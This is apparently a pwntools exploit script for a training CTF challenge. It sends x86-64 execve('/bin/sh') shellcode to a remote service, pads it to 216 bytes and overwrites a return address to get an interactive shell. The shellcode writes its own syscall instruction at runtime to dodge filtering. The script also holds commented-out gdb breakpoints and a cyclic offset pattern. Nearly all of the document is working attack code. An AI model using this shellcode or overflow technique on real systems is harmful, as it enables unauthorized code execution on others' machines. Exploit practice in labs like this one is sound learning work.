from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

#r = process("./syscall") 
r = remote("bin.training.jinblack.it", 3101)

'''
jmp binsh
beforethemove:
mov rax, 0x3b
pop rdi
xor rsi, rsi
xor rdx, rsi
xor rbx, rbx
mov rbx, 0x050e
add rbx, 0x1
mov [rip], rbx
nop
nop
nop
nop
nop
nop
nop
nop


binsh:
call beforethemove
'''




'''
gdb.attach(r, """
	b *(prog+53)
	c
	ni 2
	si
	ni 5
""")
'''





shellcode_64 = b"\xEB\x2B\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\x31\xF6\x48\x31\xF2\x48\x31\xDB\x48\xC7\xC3\x0E\x05\x00\x00\x48\x83\xC3\x01\x48\x89\x1D\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90\xE8\xD0\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"A" * 216 + p64(0x00404080) 
shellcode = shellcode_64.ljust(216,b"A") + p64(0x00404080) #+ b"/bin/sh\x00"
#shellcode = shellcode + b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaah" 
shellcode = shellcode.ljust(1000, b"C") #+ p64(0x404080) 
print(shellcode)
#print("lunghezza in bytes dello shellcode: "+ str(len(shellcode)))

r.send(shellcode)

r.interactive()

input("ls")
